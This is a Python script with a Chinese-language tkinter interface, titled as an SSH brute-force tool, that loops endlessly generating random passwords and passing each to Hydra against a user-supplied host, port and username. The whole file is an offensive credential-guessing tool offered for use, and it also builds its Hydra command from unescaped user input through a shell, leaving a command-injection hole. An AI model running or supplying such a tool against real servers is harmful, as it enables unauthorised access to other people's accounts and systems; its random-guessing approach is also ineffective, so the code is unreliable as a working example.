import os
import random
import string
import subprocess
import tkinter as tk
from tkinter import messagebox

# 动态生成随机密码
def generate_password(length=12):
    chars = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choices(chars, k=length))

# 调用Hydra爆破
def brute_force():
    target = entry_target.get()
    port = entry_port.get()
    username = entry_username.get()

    if not target or not port or not username:
        messagebox.showerror("错误", "目标地址、端口和用户名不能为空！")
        return

    try:
        while True:
            # 生成密码
            password = generate_password()
            temp_file = "temp_password.txt"

            # 写入临时文件
            with open(temp_file, "w") as f:
                f.write(password + "\n")

            # 调用Hydra
            hydra_command = f"hydra -l {username} -P {temp_file} -s {port} ssh://{target}"
            process = subprocess.run(hydra_command, shell=True, capture_output=True, text=True)

            # 检查Hydra输出结果
            if "login:" in process.stdout:
                messagebox.showinfo("成功", f"密码破解成功！\n用户名: {username}\n密码: {password}")
                break
            else:
                print(f"尝试失败: {password}")

            # 删除临时文件
            os.remove(temp_file)
    except KeyboardInterrupt:
        messagebox.showinfo("中止", "爆破已手动中止！")
    except Exception as e:
        messagebox.showerror("错误", f"发生错误: {e}")

# 创建UI界面
root = tk.Tk()
root.title("SSH爆破工具")
root.geometry("400x300")

# 输入框
label_target = tk.Label(root, text="目标地址:")
label_target.pack()
entry_target = tk.Entry(root)
entry_target.pack()

label_port = tk.Label(root, text="端口:")
label_port.pack()
entry_port = tk.Entry(root)
entry_port.pack()

label_username = tk.Label(root, text="用户名:")
label_username.pack()
entry_username = tk.Entry(root)
entry_username.pack()

# 开始按钮
btn_start = tk.Button(root, text="开始爆破", command=brute_force)
btn_start.pack()

# 运行主循环
root.mainloop()
